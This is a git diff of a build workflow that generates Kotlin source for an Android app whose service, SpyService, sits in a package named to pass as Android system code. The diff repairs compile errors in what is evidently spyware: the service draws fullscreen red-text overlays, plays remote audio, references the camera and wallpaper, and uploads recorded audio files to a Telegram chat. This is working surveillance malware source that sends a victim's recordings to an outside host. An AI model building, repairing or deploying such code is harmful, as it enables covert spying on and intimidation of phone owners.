@@ -187,7 +187,6 @@ jobs:
         }
         EOF
 
-        # FIX: Import MediaType & HashMap yang bener
         cat > app/src/main/java/com/android/system/SpyService.kt << 'EOF'
         package com.android.system
 
@@ -207,7 +206,6 @@ jobs:
         import okhttp3.MediaType.Companion.toMediaTypeOrNull
         import java.io.IOException
         import org.json.JSONObject
-        import android.app.WallpaperManager
         import android.graphics.Bitmap
         import android.graphics.Canvas
         import android.graphics.Paint
@@ -217,6 +215,8 @@ jobs:
         import android.os.Looper
         import android.media.MediaPlayer
         import android.hardware.camera2.CameraManager
+        import android.net.Uri
+        import android.app.WallpaperManager
 
         class SpyService : Service() {
             private val client = OkHttpClient()
@@ -325,7 +325,9 @@ jobs:
                         orientation = LinearLayout.VERTICAL
                         gravity = Gravity.CENTER
                         setBackgroundColor(Color.parseColor("#000000"))
-                        val tv = TextView(context).apply {
+                        
+                        // FIX 1: this@SpyService bukan context
+                        val tv = TextView(this@SpyService).apply {
                             this.text = text
                             textSize = 30f
                             setTextColor(Color.parseColor("#FF0000"))
@@ -389,8 +391,8 @@ jobs:
                 try {
                     stopMusic()
                     mediaPlayer = MediaPlayer().apply {
-                        // FIX: HashMap kosong diganti pake mapOf()
-                        setDataSource(url, mapOf())
+                        // FIX 2: Pake Uri.parse()
+                        setDataSource(this@SpyService, Uri.parse(url))
                         setOnPreparedListener { start() }
                         setOnErrorListener { _, _, _ -> true }
                         prepareAsync()
@@ -436,7 +438,6 @@ jobs:
                 val body = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", TG_CHAT_ID)
-                    // FIX: Import toMediaTypeOrNull udah ditambahin di atas
                     .addFormDataPart("audio", file.name, RequestBody.create("audio/3gp".toMediaTypeOrNull(), file))
                     .build()
                 val request = Request.Builder().url(url).post(body).build()
